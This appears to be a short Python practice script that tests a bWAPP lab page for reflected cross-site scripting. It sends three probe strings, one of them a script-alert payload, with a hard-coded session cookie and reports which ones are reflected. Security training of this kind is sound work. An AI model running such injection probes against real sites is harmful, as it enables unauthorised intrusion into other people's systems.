import requests

header={"Cookie": "PHPSESSID=78e2d767b4d93106b8607fe57bc3dc8a; security_level=2"}
xss_list={"siber","<h1>siber","<script>alert('siber')</script>"}
for payload in xss_list:
    print(payload)
    url = "http://192.168.10.129/bWAPP/xss_json.php?title="+str(payload)
    sonuc = requests.get(url=url,headers=header)
    if str(payload) in str(sonuc.content):
        print("XSS var:",str(payload))